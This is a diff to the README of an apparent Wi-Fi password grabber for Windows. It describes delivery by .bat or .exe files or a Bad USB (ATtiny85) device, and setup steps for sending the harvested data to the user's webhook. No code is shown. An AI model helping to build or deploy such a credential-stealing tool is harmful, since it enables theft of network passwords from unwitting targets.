@@ -16,7 +16,13 @@ A Wi-fi grab *one-line* script for Windows (10 &amp; 11)
 
 - Direct shell execution on target Windows system (only one line)
 - Delivery via .bat or .exe file formats
-- (Bad) USB vector (Attiny85) using the .ino file 
+- (Bad) USB vector (Attiny85) using the .ino file
+
+## The .ino file
+
+If the ethereye.ino file doesn’t work for any reason, I’ve created a PowerShell script (*ethereye.ps1*) that performs the same function as the .bat file and can be executed directly by **ATtiny85** ⚡. The reference code is in ***ethereye2.ino***.
+
+🔧 Make sure to correctly enter your **webhook address** in the PowerShell file and the **link to your script** in the Bad USB ino file 💻.
 
 # ⚠️ Disclaimer
 This tool is released exclusively for:
